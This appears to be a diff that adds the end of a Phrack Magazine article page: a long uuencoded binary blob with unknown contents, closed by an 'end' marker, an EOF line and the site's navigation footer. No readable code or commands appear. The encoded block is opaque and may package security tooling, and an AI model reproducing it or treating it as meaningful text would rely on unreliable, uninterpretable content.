+MT`\Z\;V&quot;K&amp;&amp;ZC;%-ZS&gt;!NO69%72,&gt;WIFI;;])^P5=@0&lt;VX0WPM:O[:\&amp;I989
+M[&amp;1RKO,NW=+MZ^MPH/\23T):+@=TT:%YL7ORK,DB7-'Q8A4Y`(]=E!]\KKC5
+M?1;LI:E3OE4S]'=B\;`C`\LX+LL0:2^EMP;!$R[&quot;=#/%O+2:=@7'6H$B5HBE
+M7ABF7E0;@;S&quot;H,B)MD39S):RNWI&lt;K)\U0+N%;F!+)CW;RF&gt;\BX@I-`!*&quot;7H%
+M)%O&gt;UP[`IU7\*&lt;&lt;=PRJ81&amp;,:K5H&lt;3FO/7JF.0/15-IB3J/#7SM1,M&gt;3F:?-B
+M3MY*I(7!WM($'%F^(PT&gt;WY4,WA8MC*S(&amp;JM\_G!U2&gt;&quot;QXMM2LB3HEPD#E7&gt;Y
+M%8DDG@CQ)2O*WXNL*$)HNPQP5X09'J`1B'7E7/MESP&amp;`[',/EI/(K=:@2M/R
+MOW=9HR&gt;[])^;O[K$&lt;VJ#.QI&amp;BIM`XO,(F/VQWVJYSY&gt;(JQ(1$;J'$O6*G`+R
+M:R`C5MR([)%ZV&quot;7YM1]+(#0,^[&lt;(0M9VU@&lt;[J$BA51R6.XQ&amp;'#W[V_'03(L`
+MMV:F2LN(((OO[N0-.AI+J+@K50(\D1*8?0'+3W3;A]CZ6J%&amp;IH&quot;6D7@?&amp;E&gt;/
+M`OWRJ[:O%B&amp;+FT&amp;1I&gt;KZRO+GMBY?RS(!/.7&amp;Y+QGR68@PT3G[(F2^HQW&amp;!1&lt;
+M2QLQ&gt;!#*7`K1R@F[;=IH*8^6UH\@`)D&amp;/;H;-JEFJ#SM2;2Y:&quot;0YN&quot;TW)=S&gt;
+M:2=]&quot;+,&amp;I;QQ-`]KL_@(&gt;LY6K%6S^&gt;4RN21I$H4&lt;8&quot;*&lt;/V-T5AP\=SA3IDRF
+MI\S[5I-_U%N...T6X&amp;.#&quot;*&gt;43'[HILKMWQO9V76?T@%!4DB5,='!+SC&gt;XQ$!
+M%DV!*&amp;@45?M9'4&lt;7G9@V!PR!%4L5]1FEE\Y0'E&amp;?72PGYHX+EQ2&quot;TE&lt;D9YGV
+M,I\_A)0C#ID'5#1-())'D`'&quot;H,1&lt;,*/&amp;]UMA)]C&lt;.J+*QV&lt;`,3*DD&lt;JPL9%L
+M.D,RHF,7;R;SVZYJ&quot;1R7'&lt;'3:MH!U&quot;O+4F7*M$&lt;Y!=`[N5K$J'`V/8@IU=1H
+MF%P?R`#]%?E.7CY;RP).+EHYMEHP.S6/+Y6$50TD\;V,*9'W&quot;W^$*C13;:BN
+M=M3*E#5$-#U)TJDL?IFLF%\ZK()D-(93T:?81&lt;0L\^?//(AG7^21U#)CQO!E
+M@.QH,F`H$7FU:+1%-7XS=!H&amp;KTLH@YQ)M#&lt;BY2ZB9/*(4CJ+-L`07NJ'B8.O
+M$O4!LX^,O3;)TP:#I1(&amp;'%0R!,8$&amp;P)'.11_HFFEP&gt;*W;+=_ZTP0V\PG.B+[
+MJB'YU`9\444QR`K)DF&amp;Q[\XQHAS5KVA!+MUZYNIR$IQ4@&lt;2APR^5G4H.R,&quot;D
+MF1-D,]&gt;DM6ULL%*4\O9(X]12%6&quot;&amp;&gt;+FTD,TR'VGPY8'(7N6Q.P7?K(NTLG#[
+MF\,LPM&amp;H&amp;V)=P,SN.RKP%.G1@26/\Z8-)+RV]BU7K#KY]DDD#@^-&lt;O5=)*[V
+MO?Y]Y]4#0`]Q!G/VJ@5C%M6]!9L+?,AR-5'3?%1NM/649'40DUT&gt;H-B:.:IH
+M2&amp;G^)-#3O5V6*^A'&gt;3&lt;.)&gt;UT^WM-_`9OU)`U;U&quot;&quot;Z/&amp;1Z.*[O#V.&lt;ATH^0G$
+M5W#5N[\Q75!?$)1XC`WF_&gt;4$1O%YX0N@I4#&amp;7OS9ZR7^TR![1/=S,/.J^TZ/
+M]]EJ-)'V4;LOK/[K]O*&lt;9;;`;HZ#VXI':=VE83/SS37X_;(33'ECCQJVA[]&lt;
+MSK\G\'.REVCNQ?-]I\)6M:Y1CY'NFI#2&lt;&lt;32W8%LG,3:&quot;^FY9[J&amp;QCLS.%,X
+M2&quot;-O-\)%N[\&amp;$FP^WFNK%6I&gt;,/J!;+E(,&lt;`(=,$3=$AH,S;;_6LZZ/(5W.,+
+M2^$\[7U8TKX4Q9/&gt;S/Q+Z[&gt;1N]#6%8'E&gt;T$K]R,&quot;AID_).6!A(8$$BYU4JVP
+M@5&gt;=,/0;9.G0UJG^R*7S6@!%D_5FC]WA$GKP/&gt;AOM*HQ]F#8/ML,U:40GN:X
+MDO4&lt;P4PVFP9W5A-U^_TTW]^,&amp;C*/G&gt;&amp;HONGG+#+&quot;!-N@4Q6)[E0V995]=;&lt;L
+M9;[RF@?C3SVV#6M@7X,U):_WYV4,1\@U&amp;M*N.\&amp;;C=MP.78C^IT!WG5]YVN\
+M&gt;`!31RV=Y^'FK&quot;W8TRTUB[)RA(Y`X/EM@F)(_2=,9Q0Y_T$_T7V]JZL0)XI0
+MDF8WS!)'1L?I6;37(17LN&lt;'`_+AUVGASZ.&gt;QH4.29M&amp;$D'5DA2_!AO^MC^^4
+MO\O9KV!H:%T?Y&lt;.KAQN76C,$LAT%N/0]1F['*]S('&lt;/!YZW=`VU&quot;WPK/'*LA
+MC.^+QWE-KT*S8(0_9L,IQ6QB(24V.Q\A-*HT[]YPM2HLG6XW55`#&gt;IQ%SS8+
+MZ1$-AFZ9#A0SJ052:IC(+@1I\_QW?_U7&lt;Q&amp;\'`5:RXYT1Q&quot;&quot;&quot;HF^&amp;-+QY&gt;UN
+MO_79&quot;:/%CD';8E&amp;O=10FT,`7],#?KPHO#%+&quot;#/60^HYO7\^PTB1H5+YM;[O&amp;
+M$,T(M2&amp;A_'.@@^2:7_K!K,,JC#NJ&gt;EQ'%A;\Q3H&lt;7!_&amp;YSV37OE!_B&amp;F2^AJ
+MI:W?&amp;N#\C7^M:W,RS[#&lt;_=O,ORNJ&amp;3;_=J0R&lt;497&lt;)ME)YEJ.9SZ&lt;2:-0[=Q
+M$]%=5_0\'4T4K.0/FM&quot;9MLMO&lt;O*X#UQ/M1$4'X5`3AMD.M;$RHD9`05'%J1`
+MTHHWUSTL9Y\66MY,37DG'JU,&lt;@:2)OJ`?PJ;VV]U1L/G;JUBN@*%WOUDXV,:
+MIYF=WFA_E]JW9S^K6#]ATDE+'[Q]`(;&lt;0C_S]0L)AFUDAEV$&lt;N]75@W1V,BJ
+M-^A*YMZ*&lt;Q0551%2%AVAD]YGW?J-DK&lt;&amp;!YOK0P*/!,:/&amp;!^+&lt;X!\JH$?HI$U
+M;XNSO7X9#X,M4:/;4Y!TDG!:^*,-)?O*&amp;U]@\\^S\,8@M8&amp;&quot;3XK/QOMSM]NZ
+M%1*P@7M[EVB76^_GI&gt;&gt;9OR4C,+ER$4=3*T&gt;&gt;-T\N9B-1I8J+_&gt;N/'1N[^0,S
+ML%[C.W&gt;-N*IS1Q]WA_NEO\C45N8J&amp;5Y7T%J9,;WCSM/8Q$B2JI'E=7:N?KS@
+M0_`7[CSH&gt;TG+Q=U?XJ8]M'0CM$7[0N6G)O?82:8GD^3&lt;C1,XU0VX!.&quot;@I.XS
+M#[8=MI)H5+8S-F1&amp;WN':Q(/=:6N&lt;&quot;**!Q:-T^]);V@BEN_M,UAMA&quot;BD9@I9+
+M_71X:&gt;N,T/9N][3&gt;-L85[I\(TUF!N?XO9AL,OU^=M@DE(Y=1KT?R@=YI`8/#
+MG)KX%?BB3-J39[='6U^VZK?EM111^JN_&amp;*61,XW*BCW%$02MV@U]Y[P2;'4&lt;
+M@F^@WYKP!N&lt;TK0,5O@.'I?:+!P256J3$%=QEMDHF+&quot;RZO?O]QH-X1\X+DI0X
+M'JY&amp;*OVLUT[IX!`*,BC:2X6)L@7'6ULYOBK,4UZJL/:\:(\&amp;ZJ&amp;%CK&lt;&quot;FD5=
+MN&lt;T7L&quot;VT-\VZ3B&gt;V9`\JP0-QXO##PA:0N6\0^U^7O+^*S??4&lt;4-\I;I;O,?6
+M,(!R3W7%6'FW6ZI8&quot;YFUH!X/D(4$A%LB]Z5+2;O7JV&gt;%LZC4^TWHX&amp;H&lt;;?=X
+M?2V8_Y!NP2(,U%8Z\AGA&gt;;*?[VMX`H5'I:;O&lt;ZZSD[CSX.3P.*]BX1;K_NG^
+M!IGP3%\\#'HCG?&lt;]P6[Q4K!S)&lt;\5MH&gt;:Q4&amp;1AP^6/[[RD-[70E5\M`-#H,3H
+M#*AU[BREP2]A6.#+S&gt;2P2E'R4U(UU7WV3T+66/OFWYQ_K-]/#5Q_F)BX_C2C
+M079`:2E+L`$Z%3_S4.0+LIB8UK0)]/E#&lt;M@WFYVM,!*[[@9CJNEWGZ.#W_&amp;&lt;
+MG+*Z._W^[#7,WW3D;.3VP=E]VBGRQ$^)EN(A'XB&amp;W2N:WE&gt;^R_OY!B\9.%]-
+M)V:B0(*@S0-\7]K?'FI^3W-=+X]F&quot;KJ5,^`0,'WG-#V`AG?T:KY71GC!7@:&lt;
+M&amp;RNIO!^,J`,`1'ETQ8P=W-L&amp;K?@&quot;HDO^04Y%U-];0Y%&amp;D%)S#YI6^5TGK;6D
+M#&amp;1\M8MQ[;ILPR9#^V*?&lt;7;,?6+2PA9'7&gt;@JV3=:7(9P1GU?DSDP2V91O#M]
+M80(U]03+;=XL0D*J,2:38T]&amp;HT\6UV^DS&amp;MTI&amp;:;1$06_MXGW@1W7IE$ALA.
+M?G,T5UI2K)0M^EO*G4=G5-?7/D_M5K5JLK\IM4H$IEX7,FW+KLGFA-3E8XQ6
+M&gt;0I#T&quot;JAI)E?-_6\Y#[PJ4G:7W=O&gt;MCW2E.5B!P*6SJ,QH:3-`OE!0(N8]U,
+M/0U?QU_,]-`A!7=QVXJHWTG)VEVG(:T6/R^NQN_,=#C0&lt;I6)VHWGD&gt;GDM@2/
+MKC#D]=\4&gt;HA\AUU.O8(^E2[?+21@&amp;C(2#3Z7SU_U]YT6F\(&quot;85#\,%\:NC5\
+M3GZW=?&quot;^?;6,H:?WCSPU0M,N!EGRTSC+.-GTNY8&gt;N_;&lt;'&amp;_*$04^C=YLW*0-
+MA_(!A,:#]'%$!7Q(]TU8_8Z+2Q\R8QWK.@6#4G8;S);M'K;^K%[D/F2'L?:,
+M28Y=7^'SGX5EQ9)RI?0XZ_79AIMK7#S4F!D0Q6(J]C%?7&lt;W@U6(:$F0)W5PT
+MY28U*=A?-T16*.&amp;OUC][.6&lt;%KE)1NHM(G&gt;H4IO\[J?-K.2%VFGDD(@I:Z_&quot;1
+M&amp;X'XTOH;KZ!J(P5X.X!&lt;41P:`B&amp;-R,&amp;DH51&gt;Z:&lt;Y6_ZX^,MGQ`^(RRMGD!&amp;;
+M/CSI-F@85RR\N&amp;V53'[&gt;#([3,,(Z63YAH++?.[!H57+H9LN0P.&lt;W=O&amp;8Y#E@
+M?0SQ:*]0=&amp;T8A+EQ[2@_%RI0(@1@P&gt;KW'-Z^)!WMO=MTU!LQ[&amp;P]_LG;&quot;&quot;B$
+M&amp;B4@#/+;.^QR05@:B_?H]*%N&gt;#&amp;&gt;07BB:K=,Y(V)0=#?UU:[88#J8&gt;$G%G@&lt;
+M^2&gt;\&gt;B^9MBHX5'*&amp;I:AX&lt;!P&amp;2V+@'Q%^[CI&lt;^&gt;/&amp;BV-$)3'QRW*&gt;XNM(*&gt;)R
+MS6XVSA':0YT[P1YGB&lt;D[\9]S$+O@]JOD3Q,28D,0CH=1I\&lt;.\/.B,U&gt;T#%G'
+MZJ[NI.@WU9E''_@5Q[\2?L*3A]K3*_&lt;:^)4CD[^8RZW,S9^]&gt;#T:YBA%#1.]
+M-#K$-Z?XOP(7@&amp;T\VTH8(M]&lt;-B%T+3_P7K`-912]B&lt;&gt;&gt;C(O[_IS^`^G+&lt;PJY
+MJ8'X4?&lt;_;J.X]BN#ARJW?A3GP,$$MO?:&amp;I&quot;XQ$TR_?HCZE\:FC8L5QRN1X55
+MD*Q^\/Y0DOHP!)/KY1&quot;IR%B'9\#-UPZ+GV;:BSW@WW&amp;2JZE^D:WUD*HC3ED1
+MG2]S&amp;'1+[;]/=YXD*;33C[FC_3!*T3A]IR0C5A8\A#((B4#Q4Q&gt;S]R5]-V!J
+M@$/FJ[A.O&gt;2WF-2/5C5%/BBZ4:%KY9[;4?L%(LJ(5%:X;V^A@GT%%E-GH;0N
+M:ZWE0P%7F+XI&amp;O_.)Q/:W133SJ3NXW3W3OTT0U9\O];DPC\B%$Q_#E,/.;.?
+MD'IH34QQ2A:A;X[#,-(@@R:(\H&lt;;JDD&amp;JAZ&quot;1$+%@1'F7T@%Y7YE[&quot;?3&quot;#2U
+M]%W'7K8P;K\A$B&amp;[1Q),Q1$1S`L:,7&gt;/:D$T6E=JQ5TJU;XJY6^D#,8PP2+)
+MP)`0G#5R2W,P3WYL'.&quot;:O#$G0E.^?Q00A_8W//E:D3TE,0EL&quot;DP+#C8W=D31
+M@3!A*74:4IH%1EA3MB8XG$N6KZ.D)$VRC?$SNJ0-]SM2*6(*#ZZTYSII&lt;UCR
+M,M3P]BOT5L=IL#!*U;`QNS8'63@/O.0@-39TJ3%&amp;?*@*\_]5B,0$`_L%[`_Z
+B_ZN@_)___.&lt;___G/?_[SG__\YS__^7_B?P&quot;TW*T!`,@`````
+`
+end
+
+--------[ EOF
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
